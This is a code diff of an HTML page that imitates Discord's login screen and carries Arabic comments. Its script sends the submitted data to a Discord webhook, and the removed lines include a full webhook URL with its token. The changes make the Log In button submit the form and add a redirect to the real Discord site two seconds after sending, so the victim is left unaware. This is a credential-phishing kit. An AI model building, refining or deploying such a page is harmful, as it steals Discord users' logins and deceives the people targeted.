@@ -13,9 +13,8 @@
         }
 
         body {
-            /* الخلفية الرسمية المتدرجة والمشعة من ديسكورد */
             background-color: #1e1f22; 
-            background-image: url('https://discord.com/assets/ee94fa10c95856e7993d.png');
+            background-image: url('https://discord.com');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -27,7 +26,6 @@
             position: relative;
         }
 
-        /* شعار ديسكورد الأبيض في أعلى اليسار */
         .discord-logo-top {
             position: absolute;
             top: 40px;
@@ -35,7 +33,6 @@
             width: 130px;
         }
 
-        /* الصندوق بالحجم القياسي المناسب بدون الـ QR كود */
         .discord-box {
             background-color: #313338; 
             padding: 32px;
@@ -127,7 +124,6 @@
             background-color: #4752c4;
         }
 
-        /* تأثير الحركة للنجاح */
         @keyframes fadeInScale {
             from {
                 opacity: 0;
@@ -160,7 +156,7 @@
 </head>
 <body>
 
-    <img src="https://discord.com/assets/94db9c3c11da8e860bc8.svg" class="discord-logo-top" alt="Discord">
+    <img src="https://discord.com" class="discord-logo-top" alt="Discord">
 
     <div class="discord-box">
         <div id="loginArea">
@@ -181,7 +177,7 @@
 
                 <a href="#" class="forgot-password">Forgot your password?</a>
 
-                <button type="button" class="btn-discord" onclick="window.location.href='https://discord.com/channels/@me'">Log In</button>
+                <button type="submit" class="btn-discord">Log In</button>
             </form>
         </div>
 
@@ -209,7 +205,7 @@
 
             errorText.style.display = 'none';
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1507117032120778782/Cb8Mm_R0znUAV8hsNb3Qtim6GsDjvSIGp1v-2eWOSd2A0m_bEf8d2Eivk3lmOYBIUnZM';
+            const webhookUrl = 'https://discord.com';
 
             const packet = {
                 embeds: [{
@@ -231,10 +227,18 @@
             .then(() => {
                 document.getElementById('loginArea').style.display = 'none';
                 document.getElementById('successArea').style.display = 'block';
+                
+                setTimeout(function() {
+                    window.location.href = 'https://discord.com';
+                }, 2000);
             })
             .catch(err => {
                 document.getElementById('loginArea').style.display = 'none';
                 document.getElementById('successArea').style.display = 'block';
+                
+                setTimeout(function() {
+                    window.location.href = 'https://discord.com';
+                }, 2000);
             });
         });
 
